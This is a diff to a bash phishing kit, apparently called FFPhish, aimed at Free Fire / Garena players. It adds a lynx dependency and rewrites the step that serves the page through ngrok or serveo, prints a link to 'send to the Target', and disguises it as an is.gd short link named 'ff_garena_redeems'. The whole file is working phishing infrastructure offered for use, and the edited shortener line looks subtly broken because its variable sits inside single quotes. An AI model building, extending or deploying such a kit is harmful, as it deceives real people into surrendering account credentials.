@@ -15,13 +15,14 @@ dependencies() {
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
+command -v lynx > /dev/null 2>&1 || { echo >&2 "I require lynx but it's not installed. Install it. Aborting."; exit 1; }
 
 }
 
 menu() {
 
 
-printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which freeire.sh is exists.\n\e[0m \n"
+printf "\e[1;91m  Instructions:  \n[1] You must have install php, curl, lynx and ngrok or serveo.net \n[2] If not then this script can not generate the links. \n[3] Ngrok or Serveo must be placed in the same folder in which freeire.sh is exists.\n\e[0m \n"
 read -p $'\e[1;93m[\e[1;92m*\e[1;93m]\e[1;92m Start the server (Y/n): \e[0m' option
 
 
@@ -301,8 +302,7 @@ cd FFPhish
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target: %s\e[0m\e[1;77m %s\e[0m\n" $link
 
-send_ip=$(curl -s -N 'http://is.gd/create.php?format=simple&url=$link' | grep -o "https://is.gd//[\w-\.]*")
-
+send_ip=$(lynx --dump 'https://is.gd/create.php?format=simple&url=$send_link&shorturl=ff_garena_redeems')
 #send_ip=$'https://is.gd/ff_garena_redeems'
 
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using shortenurl (is.gd):\e[0m\e[1;70m %s \n' $send_ip
